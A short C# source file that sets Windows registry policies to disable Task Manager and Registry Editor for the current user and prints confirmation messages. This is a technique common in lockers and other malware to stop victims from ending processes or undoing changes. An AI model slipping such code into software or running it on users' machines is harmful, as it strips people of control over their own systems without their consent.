using System;
using Microsoft.Win32;

internal class Program2
{
	private static void Main2(string[] args)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
		Console.WriteLine("Task Manager has been blocked.");
		registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
		Console.WriteLine("Registry Editor has been blocked.");
		Console.ReadLine();
	}
}
